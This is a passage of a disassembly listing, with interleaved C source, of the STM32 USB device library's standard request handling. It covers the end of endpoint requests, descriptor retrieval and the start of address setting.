 800ba90:	d002      	beq.n	800ba98 <USBD_StdEPReq+0x2d8>
 800ba92:	7bbb      	ldrb	r3, [r7, #14]
 800ba94:	2b80      	cmp	r3, #128	; 0x80
 800ba96:	d103      	bne.n	800baa0 <USBD_StdEPReq+0x2e0>
              {
                pep->status = 0x0000U;
 800ba98:	68bb      	ldr	r3, [r7, #8]
 800ba9a:	2200      	movs	r2, #0
 800ba9c:	601a      	str	r2, [r3, #0]
 800ba9e:	e00e      	b.n	800babe <USBD_StdEPReq+0x2fe>
              }
              else if (USBD_LL_IsStallEP(pdev, ep_addr) != 0U)
 800baa0:	7bbb      	ldrb	r3, [r7, #14]
 800baa2:	4619      	mov	r1, r3
 800baa4:	6878      	ldr	r0, [r7, #4]
 800baa6:	f001 f979 	bl	800cd9c <USBD_LL_IsStallEP>
 800baaa:	4603      	mov	r3, r0
 800baac:	2b00      	cmp	r3, #0
 800baae:	d003      	beq.n	800bab8 <USBD_StdEPReq+0x2f8>
              {
                pep->status = 0x0001U;
 800bab0:	68bb      	ldr	r3, [r7, #8]
 800bab2:	2201      	movs	r2, #1
 800bab4:	601a      	str	r2, [r3, #0]
 800bab6:	e002      	b.n	800babe <USBD_StdEPReq+0x2fe>
              }
              else
              {
                pep->status = 0x0000U;
 800bab8:	68bb      	ldr	r3, [r7, #8]
 800baba:	2200      	movs	r2, #0
 800babc:	601a      	str	r2, [r3, #0]
              }

              (void)USBD_CtlSendData(pdev, (uint8_t *)&pep->status, 2U);
 800babe:	68bb      	ldr	r3, [r7, #8]
 800bac0:	2202      	movs	r2, #2
 800bac2:	4619      	mov	r1, r3
 800bac4:	6878      	ldr	r0, [r7, #4]
 800bac6:	f000 fbfb 	bl	800c2c0 <USBD_CtlSendData>
              break;
 800baca:	e004      	b.n	800bad6 <USBD_StdEPReq+0x316>

            default:
              USBD_CtlError(pdev, req);
 800bacc:	6839      	ldr	r1, [r7, #0]
 800bace:	6878      	ldr	r0, [r7, #4]
 800bad0:	f000 fb85 	bl	800c1de <USBD_CtlError>
              break;
 800bad4:	bf00      	nop
          }
          break;
 800bad6:	e004      	b.n	800bae2 <USBD_StdEPReq+0x322>

        default:
          USBD_CtlError(pdev, req);
 800bad8:	6839      	ldr	r1, [r7, #0]
 800bada:	6878      	ldr	r0, [r7, #4]
 800badc:	f000 fb7f 	bl	800c1de <USBD_CtlError>
          break;
 800bae0:	bf00      	nop
      }
      break;
 800bae2:	e005      	b.n	800baf0 <USBD_StdEPReq+0x330>

    default:
      USBD_CtlError(pdev, req);
 800bae4:	6839      	ldr	r1, [r7, #0]
 800bae6:	6878      	ldr	r0, [r7, #4]
 800bae8:	f000 fb79 	bl	800c1de <USBD_CtlError>
      break;
 800baec:	e000      	b.n	800baf0 <USBD_StdEPReq+0x330>
      break;
 800baee:	bf00      	nop
  }

  return ret;
 800baf0:	7bfb      	ldrb	r3, [r7, #15]
}
 800baf2:	4618      	mov	r0, r3
 800baf4:	3710      	adds	r7, #16
 800baf6:	46bd      	mov	sp, r7
 800baf8:	bd80      	pop	{r7, pc}
	...

0800bafc <USBD_GetDescriptor>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_GetDescriptor(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800bafc:	b580      	push	{r7, lr}
 800bafe:	b084      	sub	sp, #16
 800bb00:	af00      	add	r7, sp, #0
 800bb02:	6078      	str	r0, [r7, #4]
 800bb04:	6039      	str	r1, [r7, #0]
  uint16_t len = 0U;
 800bb06:	2300      	movs	r3, #0
 800bb08:	813b      	strh	r3, [r7, #8]
  uint8_t *pbuf = NULL;
 800bb0a:	2300      	movs	r3, #0
 800bb0c:	60fb      	str	r3, [r7, #12]
  uint8_t err = 0U;
 800bb0e:	2300      	movs	r3, #0
 800bb10:	72fb      	strb	r3, [r7, #11]

  switch (req->wValue >> 8)
 800bb12:	683b      	ldr	r3, [r7, #0]
 800bb14:	885b      	ldrh	r3, [r3, #2]
 800bb16:	0a1b      	lsrs	r3, r3, #8
 800bb18:	b29b      	uxth	r3, r3
 800bb1a:	3b01      	subs	r3, #1
 800bb1c:	2b0e      	cmp	r3, #14
 800bb1e:	f200 8152 	bhi.w	800bdc6 <USBD_GetDescriptor+0x2ca>
 800bb22:	a201      	add	r2, pc, #4	; (adr r2, 800bb28 <USBD_GetDescriptor+0x2c>)
 800bb24:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800bb28:	0800bb99 	.word	0x0800bb99
 800bb2c:	0800bbb1 	.word	0x0800bbb1
 800bb30:	0800bbf1 	.word	0x0800bbf1
 800bb34:	0800bdc7 	.word	0x0800bdc7
 800bb38:	0800bdc7 	.word	0x0800bdc7
 800bb3c:	0800bd67 	.word	0x0800bd67
 800bb40:	0800bd93 	.word	0x0800bd93
 800bb44:	0800bdc7 	.word	0x0800bdc7
 800bb48:	0800bdc7 	.word	0x0800bdc7
 800bb4c:	0800bdc7 	.word	0x0800bdc7
 800bb50:	0800bdc7 	.word	0x0800bdc7
 800bb54:	0800bdc7 	.word	0x0800bdc7
 800bb58:	0800bdc7 	.word	0x0800bdc7
 800bb5c:	0800bdc7 	.word	0x0800bdc7
 800bb60:	0800bb65 	.word	0x0800bb65
  {
#if ((USBD_LPM_ENABLED == 1U) || (USBD_CLASS_BOS_ENABLED == 1U))
    case USB_DESC_TYPE_BOS:
      if (pdev->pDesc->GetBOSDescriptor != NULL)
 800bb64:	687b      	ldr	r3, [r7, #4]
 800bb66:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bb6a:	69db      	ldr	r3, [r3, #28]
 800bb6c:	2b00      	cmp	r3, #0
 800bb6e:	d00b      	beq.n	800bb88 <USBD_GetDescriptor+0x8c>
      {
        pbuf = pdev->pDesc->GetBOSDescriptor(pdev->dev_speed, &len);
 800bb70:	687b      	ldr	r3, [r7, #4]
 800bb72:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bb76:	69db      	ldr	r3, [r3, #28]
 800bb78:	687a      	ldr	r2, [r7, #4]
 800bb7a:	7c12      	ldrb	r2, [r2, #16]
 800bb7c:	f107 0108 	add.w	r1, r7, #8
 800bb80:	4610      	mov	r0, r2
 800bb82:	4798      	blx	r3
 800bb84:	60f8      	str	r0, [r7, #12]
      else
      {
        USBD_CtlError(pdev, req);
        err++;
      }
      break;
 800bb86:	e126      	b.n	800bdd6 <USBD_GetDescriptor+0x2da>
        USBD_CtlError(pdev, req);
 800bb88:	6839      	ldr	r1, [r7, #0]
 800bb8a:	6878      	ldr	r0, [r7, #4]
 800bb8c:	f000 fb27 	bl	800c1de <USBD_CtlError>
        err++;
 800bb90:	7afb      	ldrb	r3, [r7, #11]
 800bb92:	3301      	adds	r3, #1
 800bb94:	72fb      	strb	r3, [r7, #11]
      break;
 800bb96:	e11e      	b.n	800bdd6 <USBD_GetDescriptor+0x2da>
#endif /* (USBD_LPM_ENABLED == 1U) || (USBD_CLASS_BOS_ENABLED == 1U) */
    case USB_DESC_TYPE_DEVICE:
      pbuf = pdev->pDesc->GetDeviceDescriptor(pdev->dev_speed, &len);
 800bb98:	687b      	ldr	r3, [r7, #4]
 800bb9a:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bb9e:	681b      	ldr	r3, [r3, #0]
 800bba0:	687a      	ldr	r2, [r7, #4]
 800bba2:	7c12      	ldrb	r2, [r2, #16]
 800bba4:	f107 0108 	add.w	r1, r7, #8
 800bba8:	4610      	mov	r0, r2
 800bbaa:	4798      	blx	r3
 800bbac:	60f8      	str	r0, [r7, #12]
      break;
 800bbae:	e112      	b.n	800bdd6 <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_CONFIGURATION:
      if (pdev->dev_speed == USBD_SPEED_HIGH)
 800bbb0:	687b      	ldr	r3, [r7, #4]
 800bbb2:	7c1b      	ldrb	r3, [r3, #16]
 800bbb4:	2b00      	cmp	r3, #0
 800bbb6:	d10d      	bne.n	800bbd4 <USBD_GetDescriptor+0xd8>
          pbuf   = (uint8_t *)USBD_CMPSIT.GetHSConfigDescriptor(&len);
        }
        else
#endif /* USE_USBD_COMPOSITE */
        {
          pbuf = (uint8_t *)pdev->pClass[0]->GetHSConfigDescriptor(&len);
 800bbb8:	687b      	ldr	r3, [r7, #4]
 800bbba:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bbbe:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 800bbc0:	f107 0208 	add.w	r2, r7, #8
 800bbc4:	4610      	mov	r0, r2
 800bbc6:	4798      	blx	r3
 800bbc8:	60f8      	str	r0, [r7, #12]
        }
        pbuf[1] = USB_DESC_TYPE_CONFIGURATION;
 800bbca:	68fb      	ldr	r3, [r7, #12]
 800bbcc:	3301      	adds	r3, #1
 800bbce:	2202      	movs	r2, #2
 800bbd0:	701a      	strb	r2, [r3, #0]
        {
          pbuf   = (uint8_t *)pdev->pClass[0]->GetFSConfigDescriptor(&len);
        }
        pbuf[1] = USB_DESC_TYPE_CONFIGURATION;
      }
      break;
 800bbd2:	e100      	b.n	800bdd6 <USBD_GetDescriptor+0x2da>
          pbuf   = (uint8_t *)pdev->pClass[0]->GetFSConfigDescriptor(&len);
 800bbd4:	687b      	ldr	r3, [r7, #4]
 800bbd6:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bbda:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 800bbdc:	f107 0208 	add.w	r2, r7, #8
 800bbe0:	4610      	mov	r0, r2
 800bbe2:	4798      	blx	r3
 800bbe4:	60f8      	str	r0, [r7, #12]
        pbuf[1] = USB_DESC_TYPE_CONFIGURATION;
 800bbe6:	68fb      	ldr	r3, [r7, #12]
 800bbe8:	3301      	adds	r3, #1
 800bbea:	2202      	movs	r2, #2
 800bbec:	701a      	strb	r2, [r3, #0]
      break;
 800bbee:	e0f2      	b.n	800bdd6 <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_STRING:
      switch ((uint8_t)(req->wValue))
 800bbf0:	683b      	ldr	r3, [r7, #0]
 800bbf2:	885b      	ldrh	r3, [r3, #2]
 800bbf4:	b2db      	uxtb	r3, r3
 800bbf6:	2b05      	cmp	r3, #5
 800bbf8:	f200 80ac 	bhi.w	800bd54 <USBD_GetDescriptor+0x258>
 800bbfc:	a201      	add	r2, pc, #4	; (adr r2, 800bc04 <USBD_GetDescriptor+0x108>)
 800bbfe:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800bc02:	bf00      	nop
 800bc04:	0800bc1d 	.word	0x0800bc1d
 800bc08:	0800bc51 	.word	0x0800bc51
 800bc0c:	0800bc85 	.word	0x0800bc85
 800bc10:	0800bcb9 	.word	0x0800bcb9
 800bc14:	0800bced 	.word	0x0800bced
 800bc18:	0800bd21 	.word	0x0800bd21
      {
        case USBD_IDX_LANGID_STR:
          if (pdev->pDesc->GetLangIDStrDescriptor != NULL)
 800bc1c:	687b      	ldr	r3, [r7, #4]
 800bc1e:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc22:	685b      	ldr	r3, [r3, #4]
 800bc24:	2b00      	cmp	r3, #0
 800bc26:	d00b      	beq.n	800bc40 <USBD_GetDescriptor+0x144>
          {
            pbuf = pdev->pDesc->GetLangIDStrDescriptor(pdev->dev_speed, &len);
 800bc28:	687b      	ldr	r3, [r7, #4]
 800bc2a:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc2e:	685b      	ldr	r3, [r3, #4]
 800bc30:	687a      	ldr	r2, [r7, #4]
 800bc32:	7c12      	ldrb	r2, [r2, #16]
 800bc34:	f107 0108 	add.w	r1, r7, #8
 800bc38:	4610      	mov	r0, r2
 800bc3a:	4798      	blx	r3
 800bc3c:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bc3e:	e091      	b.n	800bd64 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bc40:	6839      	ldr	r1, [r7, #0]
 800bc42:	6878      	ldr	r0, [r7, #4]
 800bc44:	f000 facb 	bl	800c1de <USBD_CtlError>
            err++;
 800bc48:	7afb      	ldrb	r3, [r7, #11]
 800bc4a:	3301      	adds	r3, #1
 800bc4c:	72fb      	strb	r3, [r7, #11]
          break;
 800bc4e:	e089      	b.n	800bd64 <USBD_GetDescriptor+0x268>

        case USBD_IDX_MFC_STR:
          if (pdev->pDesc->GetManufacturerStrDescriptor != NULL)
 800bc50:	687b      	ldr	r3, [r7, #4]
 800bc52:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc56:	689b      	ldr	r3, [r3, #8]
 800bc58:	2b00      	cmp	r3, #0
 800bc5a:	d00b      	beq.n	800bc74 <USBD_GetDescriptor+0x178>
          {
            pbuf = pdev->pDesc->GetManufacturerStrDescriptor(pdev->dev_speed, &len);
 800bc5c:	687b      	ldr	r3, [r7, #4]
 800bc5e:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc62:	689b      	ldr	r3, [r3, #8]
 800bc64:	687a      	ldr	r2, [r7, #4]
 800bc66:	7c12      	ldrb	r2, [r2, #16]
 800bc68:	f107 0108 	add.w	r1, r7, #8
 800bc6c:	4610      	mov	r0, r2
 800bc6e:	4798      	blx	r3
 800bc70:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bc72:	e077      	b.n	800bd64 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bc74:	6839      	ldr	r1, [r7, #0]
 800bc76:	6878      	ldr	r0, [r7, #4]
 800bc78:	f000 fab1 	bl	800c1de <USBD_CtlError>
            err++;
 800bc7c:	7afb      	ldrb	r3, [r7, #11]
 800bc7e:	3301      	adds	r3, #1
 800bc80:	72fb      	strb	r3, [r7, #11]
          break;
 800bc82:	e06f      	b.n	800bd64 <USBD_GetDescriptor+0x268>

        case USBD_IDX_PRODUCT_STR:
          if (pdev->pDesc->GetProductStrDescriptor != NULL)
 800bc84:	687b      	ldr	r3, [r7, #4]
 800bc86:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc8a:	68db      	ldr	r3, [r3, #12]
 800bc8c:	2b00      	cmp	r3, #0
 800bc8e:	d00b      	beq.n	800bca8 <USBD_GetDescriptor+0x1ac>
          {
            pbuf = pdev->pDesc->GetProductStrDescriptor(pdev->dev_speed, &len);
 800bc90:	687b      	ldr	r3, [r7, #4]
 800bc92:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc96:	68db      	ldr	r3, [r3, #12]
 800bc98:	687a      	ldr	r2, [r7, #4]
 800bc9a:	7c12      	ldrb	r2, [r2, #16]
 800bc9c:	f107 0108 	add.w	r1, r7, #8
 800bca0:	4610      	mov	r0, r2
 800bca2:	4798      	blx	r3
 800bca4:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bca6:	e05d      	b.n	800bd64 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bca8:	6839      	ldr	r1, [r7, #0]
 800bcaa:	6878      	ldr	r0, [r7, #4]
 800bcac:	f000 fa97 	bl	800c1de <USBD_CtlError>
            err++;
 800bcb0:	7afb      	ldrb	r3, [r7, #11]
 800bcb2:	3301      	adds	r3, #1
 800bcb4:	72fb      	strb	r3, [r7, #11]
          break;
 800bcb6:	e055      	b.n	800bd64 <USBD_GetDescriptor+0x268>

        case USBD_IDX_SERIAL_STR:
          if (pdev->pDesc->GetSerialStrDescriptor != NULL)
 800bcb8:	687b      	ldr	r3, [r7, #4]
 800bcba:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bcbe:	691b      	ldr	r3, [r3, #16]
 800bcc0:	2b00      	cmp	r3, #0
 800bcc2:	d00b      	beq.n	800bcdc <USBD_GetDescriptor+0x1e0>
          {
            pbuf = pdev->pDesc->GetSerialStrDescriptor(pdev->dev_speed, &len);
 800bcc4:	687b      	ldr	r3, [r7, #4]
 800bcc6:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bcca:	691b      	ldr	r3, [r3, #16]
 800bccc:	687a      	ldr	r2, [r7, #4]
 800bcce:	7c12      	ldrb	r2, [r2, #16]
 800bcd0:	f107 0108 	add.w	r1, r7, #8
 800bcd4:	4610      	mov	r0, r2
 800bcd6:	4798      	blx	r3
 800bcd8:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bcda:	e043      	b.n	800bd64 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bcdc:	6839      	ldr	r1, [r7, #0]
 800bcde:	6878      	ldr	r0, [r7, #4]
 800bce0:	f000 fa7d 	bl	800c1de <USBD_CtlError>
            err++;
 800bce4:	7afb      	ldrb	r3, [r7, #11]
 800bce6:	3301      	adds	r3, #1
 800bce8:	72fb      	strb	r3, [r7, #11]
          break;
 800bcea:	e03b      	b.n	800bd64 <USBD_GetDescriptor+0x268>

        case USBD_IDX_CONFIG_STR:
          if (pdev->pDesc->GetConfigurationStrDescriptor != NULL)
 800bcec:	687b      	ldr	r3, [r7, #4]
 800bcee:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bcf2:	695b      	ldr	r3, [r3, #20]
 800bcf4:	2b00      	cmp	r3, #0
 800bcf6:	d00b      	beq.n	800bd10 <USBD_GetDescriptor+0x214>
          {
            pbuf = pdev->pDesc->GetConfigurationStrDescriptor(pdev->dev_speed, &len);
 800bcf8:	687b      	ldr	r3, [r7, #4]
 800bcfa:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bcfe:	695b      	ldr	r3, [r3, #20]
 800bd00:	687a      	ldr	r2, [r7, #4]
 800bd02:	7c12      	ldrb	r2, [r2, #16]
 800bd04:	f107 0108 	add.w	r1, r7, #8
 800bd08:	4610      	mov	r0, r2
 800bd0a:	4798      	blx	r3
 800bd0c:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bd0e:	e029      	b.n	800bd64 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bd10:	6839      	ldr	r1, [r7, #0]
 800bd12:	6878      	ldr	r0, [r7, #4]
 800bd14:	f000 fa63 	bl	800c1de <USBD_CtlError>
            err++;
 800bd18:	7afb      	ldrb	r3, [r7, #11]
 800bd1a:	3301      	adds	r3, #1
 800bd1c:	72fb      	strb	r3, [r7, #11]
          break;
 800bd1e:	e021      	b.n	800bd64 <USBD_GetDescriptor+0x268>

        case USBD_IDX_INTERFACE_STR:
          if (pdev->pDesc->GetInterfaceStrDescriptor != NULL)
 800bd20:	687b      	ldr	r3, [r7, #4]
 800bd22:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bd26:	699b      	ldr	r3, [r3, #24]
 800bd28:	2b00      	cmp	r3, #0
 800bd2a:	d00b      	beq.n	800bd44 <USBD_GetDescriptor+0x248>
          {
            pbuf = pdev->pDesc->GetInterfaceStrDescriptor(pdev->dev_speed, &len);
 800bd2c:	687b      	ldr	r3, [r7, #4]
 800bd2e:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bd32:	699b      	ldr	r3, [r3, #24]
 800bd34:	687a      	ldr	r2, [r7, #4]
 800bd36:	7c12      	ldrb	r2, [r2, #16]
 800bd38:	f107 0108 	add.w	r1, r7, #8
 800bd3c:	4610      	mov	r0, r2
 800bd3e:	4798      	blx	r3
 800bd40:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bd42:	e00f      	b.n	800bd64 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bd44:	6839      	ldr	r1, [r7, #0]
 800bd46:	6878      	ldr	r0, [r7, #4]
 800bd48:	f000 fa49 	bl	800c1de <USBD_CtlError>
            err++;
 800bd4c:	7afb      	ldrb	r3, [r7, #11]
 800bd4e:	3301      	adds	r3, #1
 800bd50:	72fb      	strb	r3, [r7, #11]
          break;
 800bd52:	e007      	b.n	800bd64 <USBD_GetDescriptor+0x268>
            err++;
          }
#endif /* USBD_SUPPORT_USER_STRING_DESC  */

#if ((USBD_CLASS_USER_STRING_DESC == 0U) && (USBD_SUPPORT_USER_STRING_DESC == 0U))
          USBD_CtlError(pdev, req);
 800bd54:	6839      	ldr	r1, [r7, #0]
 800bd56:	6878      	ldr	r0, [r7, #4]
 800bd58:	f000 fa41 	bl	800c1de <USBD_CtlError>
          err++;
 800bd5c:	7afb      	ldrb	r3, [r7, #11]
 800bd5e:	3301      	adds	r3, #1
 800bd60:	72fb      	strb	r3, [r7, #11]
#endif /* (USBD_CLASS_USER_STRING_DESC == 0U) && (USBD_SUPPORT_USER_STRING_DESC == 0U) */
          break;
 800bd62:	bf00      	nop
      }
      break;
 800bd64:	e037      	b.n	800bdd6 <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_DEVICE_QUALIFIER:
      if (pdev->dev_speed == USBD_SPEED_HIGH)
 800bd66:	687b      	ldr	r3, [r7, #4]
 800bd68:	7c1b      	ldrb	r3, [r3, #16]
 800bd6a:	2b00      	cmp	r3, #0
 800bd6c:	d109      	bne.n	800bd82 <USBD_GetDescriptor+0x286>
          pbuf = (uint8_t *)USBD_CMPSIT.GetDeviceQualifierDescriptor(&len);
        }
        else
#endif /* USE_USBD_COMPOSITE */
        {
          pbuf = (uint8_t *)pdev->pClass[0]->GetDeviceQualifierDescriptor(&len);
 800bd6e:	687b      	ldr	r3, [r7, #4]
 800bd70:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bd74:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 800bd76:	f107 0208 	add.w	r2, r7, #8
 800bd7a:	4610      	mov	r0, r2
 800bd7c:	4798      	blx	r3
 800bd7e:	60f8      	str	r0, [r7, #12]
      else
      {
        USBD_CtlError(pdev, req);
        err++;
      }
      break;
 800bd80:	e029      	b.n	800bdd6 <USBD_GetDescriptor+0x2da>
        USBD_CtlError(pdev, req);
 800bd82:	6839      	ldr	r1, [r7, #0]
 800bd84:	6878      	ldr	r0, [r7, #4]
 800bd86:	f000 fa2a 	bl	800c1de <USBD_CtlError>
        err++;
 800bd8a:	7afb      	ldrb	r3, [r7, #11]
 800bd8c:	3301      	adds	r3, #1
 800bd8e:	72fb      	strb	r3, [r7, #11]
      break;
 800bd90:	e021      	b.n	800bdd6 <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_OTHER_SPEED_CONFIGURATION:
      if (pdev->dev_speed == USBD_SPEED_HIGH)
 800bd92:	687b      	ldr	r3, [r7, #4]
 800bd94:	7c1b      	ldrb	r3, [r3, #16]
 800bd96:	2b00      	cmp	r3, #0
 800bd98:	d10d      	bne.n	800bdb6 <USBD_GetDescriptor+0x2ba>
          pbuf = (uint8_t *)USBD_CMPSIT.GetOtherSpeedConfigDescriptor(&len);
        }
        else
#endif /* USE_USBD_COMPOSITE */
        {
          pbuf = (uint8_t *)pdev->pClass[0]->GetOtherSpeedConfigDescriptor(&len);
 800bd9a:	687b      	ldr	r3, [r7, #4]
 800bd9c:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bda0:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 800bda2:	f107 0208 	add.w	r2, r7, #8
 800bda6:	4610      	mov	r0, r2
 800bda8:	4798      	blx	r3
 800bdaa:	60f8      	str	r0, [r7, #12]
        }
        pbuf[1] = USB_DESC_TYPE_OTHER_SPEED_CONFIGURATION;
 800bdac:	68fb      	ldr	r3, [r7, #12]
 800bdae:	3301      	adds	r3, #1
 800bdb0:	2207      	movs	r2, #7
 800bdb2:	701a      	strb	r2, [r3, #0]
      else
      {
        USBD_CtlError(pdev, req);
        err++;
      }
      break;
 800bdb4:	e00f      	b.n	800bdd6 <USBD_GetDescriptor+0x2da>
        USBD_CtlError(pdev, req);
 800bdb6:	6839      	ldr	r1, [r7, #0]
 800bdb8:	6878      	ldr	r0, [r7, #4]
 800bdba:	f000 fa10 	bl	800c1de <USBD_CtlError>
        err++;
 800bdbe:	7afb      	ldrb	r3, [r7, #11]
 800bdc0:	3301      	adds	r3, #1
 800bdc2:	72fb      	strb	r3, [r7, #11]
      break;
 800bdc4:	e007      	b.n	800bdd6 <USBD_GetDescriptor+0x2da>

    default:
      USBD_CtlError(pdev, req);
 800bdc6:	6839      	ldr	r1, [r7, #0]
 800bdc8:	6878      	ldr	r0, [r7, #4]
 800bdca:	f000 fa08 	bl	800c1de <USBD_CtlError>
      err++;
 800bdce:	7afb      	ldrb	r3, [r7, #11]
 800bdd0:	3301      	adds	r3, #1
 800bdd2:	72fb      	strb	r3, [r7, #11]
      break;
 800bdd4:	bf00      	nop
  }

  if (err != 0U)
 800bdd6:	7afb      	ldrb	r3, [r7, #11]
 800bdd8:	2b00      	cmp	r3, #0
 800bdda:	d11e      	bne.n	800be1a <USBD_GetDescriptor+0x31e>
  {
    return;
  }

  if (req->wLength != 0U)
 800bddc:	683b      	ldr	r3, [r7, #0]
 800bdde:	88db      	ldrh	r3, [r3, #6]
 800bde0:	2b00      	cmp	r3, #0
 800bde2:	d016      	beq.n	800be12 <USBD_GetDescriptor+0x316>
  {
    if (len != 0U)
 800bde4:	893b      	ldrh	r3, [r7, #8]
 800bde6:	2b00      	cmp	r3, #0
 800bde8:	d00e      	beq.n	800be08 <USBD_GetDescriptor+0x30c>
    {
      len = MIN(len, req->wLength);
 800bdea:	683b      	ldr	r3, [r7, #0]
 800bdec:	88da      	ldrh	r2, [r3, #6]
 800bdee:	893b      	ldrh	r3, [r7, #8]
 800bdf0:	4293      	cmp	r3, r2
 800bdf2:	bf28      	it	cs
 800bdf4:	4613      	movcs	r3, r2
 800bdf6:	b29b      	uxth	r3, r3
 800bdf8:	813b      	strh	r3, [r7, #8]
      (void)USBD_CtlSendData(pdev, pbuf, len);
 800bdfa:	893b      	ldrh	r3, [r7, #8]
 800bdfc:	461a      	mov	r2, r3
 800bdfe:	68f9      	ldr	r1, [r7, #12]
 800be00:	6878      	ldr	r0, [r7, #4]
 800be02:	f000 fa5d 	bl	800c2c0 <USBD_CtlSendData>
 800be06:	e009      	b.n	800be1c <USBD_GetDescriptor+0x320>
    }
    else
    {
      USBD_CtlError(pdev, req);
 800be08:	6839      	ldr	r1, [r7, #0]
 800be0a:	6878      	ldr	r0, [r7, #4]
 800be0c:	f000 f9e7 	bl	800c1de <USBD_CtlError>
 800be10:	e004      	b.n	800be1c <USBD_GetDescriptor+0x320>
    }
  }
  else
  {
    (void)USBD_CtlSendStatus(pdev);
 800be12:	6878      	ldr	r0, [r7, #4]
 800be14:	f000 faae 	bl	800c374 <USBD_CtlSendStatus>
 800be18:	e000      	b.n	800be1c <USBD_GetDescriptor+0x320>
    return;
 800be1a:	bf00      	nop
  }
}
 800be1c:	3710      	adds	r7, #16
 800be1e:	46bd      	mov	sp, r7
 800be20:	bd80      	pop	{r7, pc}
 800be22:	bf00      	nop

0800be24 <USBD_SetAddress>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_SetAddress(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800be24:	b580      	push	{r7, lr}
 800be26:	b084      	sub	sp, #16
 800be28:	af00      	add	r7, sp, #0
 800be2a:	6078      	str	r0, [r7, #4]
 800be2c:	6039      	str	r1, [r7, #0]
  uint8_t  dev_addr;

  if ((req->wIndex == 0U) && (req->wLength == 0U) && (req->wValue < 128U))
 800be2e:	683b      	ldr	r3, [r7, #0]
 800be30:	889b      	ldrh	r3, [r3, #4]
 800be32:	2b00      	cmp	r3, #0
 800be34:	d131      	bne.n	800be9a <USBD_SetAddress+0x76>
 800be36:	683b      	ldr	r3, [r7, #0]
 800be38:	88db      	ldrh	r3, [r3, #6]
 800be3a:	2b00      	cmp	r3, #0
 800be3c:	d12d      	bne.n	800be9a <USBD_SetAddress+0x76>
 800be3e:	683b      	ldr	r3, [r7, #0]
 800be40:	885b      	ldrh	r3, [r3, #2]
 800be42:	2b7f      	cmp	r3, #127	; 0x7f
 800be44:	d829      	bhi.n	800be9a <USBD_SetAddress+0x76>
  {
    dev_addr = (uint8_t)(req->wValue) & 0x7FU;
 800be46:	683b      	ldr	r3, [r7, #0]
 800be48:	885b      	ldrh	r3, [r3, #2]
 800be4a:	b2db      	uxtb	r3, r3
 800be4c:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800be50:	73fb      	strb	r3, [r7, #15]

    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800be52:	687b      	ldr	r3, [r7, #4]
 800be54:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800be58:	b2db      	uxtb	r3, r3
 800be5a:	2b03      	cmp	r3, #3
 800be5c:	d104      	bne.n	800be68 <USBD_SetAddress+0x44>
    {
      USBD_CtlError(pdev, req);
 800be5e:	6839      	ldr	r1, [r7, #0]
 800be60:	6878      	ldr	r0, [r7, #4]
 800be62:	f000 f9bc 	bl	800c1de <USBD_CtlError>
    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800be66:	e01d      	b.n	800bea4 <USBD_SetAddress+0x80>
    }
    else
    {
      pdev->dev_address = dev_addr;
 800be68:	687b      	ldr	r3, [r7, #4]
 800be6a:	7bfa      	ldrb	r2, [r7, #15]
 800be6c:	f883 229e 	strb.w	r2, [r3, #670]	; 0x29e
